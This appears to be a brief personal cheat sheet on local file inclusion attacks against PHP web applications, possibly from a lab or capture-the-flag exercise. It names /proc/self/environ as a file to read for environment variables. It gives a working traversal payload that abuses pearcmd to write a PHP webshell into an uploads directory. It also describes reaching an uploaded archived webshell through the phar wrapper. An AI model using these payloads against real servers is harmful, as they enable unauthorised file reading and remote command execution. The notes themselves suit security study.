# LFI

bypassing permissions to access files local to the victim machine

## Environment Variables

/proc/self/environ

## RCE

`?page=../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?system($_GET['cmd']);?>+/var/www/itrc/uploads/shell.php`

The above payload creates a webshell in the uploads folder that can be used to execute code

## Accessing compressed data 

php wrapper phar can access files uploaded to a compressed archive. if you can upload a compressed webshell and access the archive through lfi, you may be able to access the shell
